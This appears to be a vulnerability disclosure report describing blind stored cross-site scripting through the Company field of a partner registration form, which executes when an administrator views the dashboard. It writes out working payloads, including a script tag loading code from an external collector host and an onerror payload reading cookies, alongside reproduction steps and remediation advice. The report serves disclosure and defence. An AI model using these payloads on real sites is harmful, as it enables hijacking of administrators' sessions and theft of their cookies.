## Title

Blind Cross-Site Scripting (XSS) via Unsanitized Company Field on Informatica Cloud Admin Dashboard.

## Affected URL

https://partners.pwnedbox.site/

## Description

A Blind Cross-Site Scripting (XSS) vulnerability was identified in the user registration handler of the Informatica Cloud partner platform. User-supplied input submitted through registration fields (specifically the Company field) is stored persistently in the backend database without proper input sanitization, encoding, or output escaping.

When an administrative user reviews registered users within the admin dashboard (`dashboard.php`), the stored payloads—such as `<script src="https://xss.report/c/vansh"></script>`—are rendered directly into the Document Object Model (DOM). This causes the malicious script to execute asynchronously within the administrative user's privileged session context, allowing remote code execution, session hijacking, or administrative action compromise.

## Steps to Reproduce

1. Navigate to the target application registration interface (`https://partners.pwnedbox.site/register.php` or account creation form).
2. Locate the registration fields and inject JavaScript payloads into the Company field (e.g., entering `'"&><script src="https://xss.report/c/vansh"></script>` or `<img src=x onerror=alert(document.cookie)>`).
3. Complete and submit the account registration form.
4. Log into the administrative control panel where registered users are reviewed (`https://partners.pwnedbox.site/admin/dashboard.php`).
5. Observe that the stored payload executes in the DOM of the administrative dashboard, firing requests to the external collector (`xss.report`).

## POC

<img width="869" height="558" alt="image" src="https://github.com/user-attachments/assets/7378fd07-18e4-403f-b662-d3a0c5bbb56c" />
<img width="1672" height="1145" alt="image" src="https://github.com/user-attachments/assets/96b518d5-c3d7-48d6-ba81-fa01ceeddafe" />

## Impact
Execution of arbitrary JavaScript code within the high-privilege session of an administrator reviewing registered user accounts.

Compromise of administrative sessions, potential cookie or token exfiltration, and unauthorized modification of user records or application data.

Persistent code execution affecting backend management panels and staff review dashboards.

## Remediation
Implement strict context-aware output encoding (such as HTML entity encoding) for all stored user inputs when rendering them in administrative tables, dashboards, or detail views.

Apply strict input validation and sanitization policies on all registration endpoints (Company name, Name, Email fields) to reject or neutralize HTML markup and script tags.

Deploy a comprehensive Content Security Policy (CSP) restricting inline script execution and unauthorized external script domains.
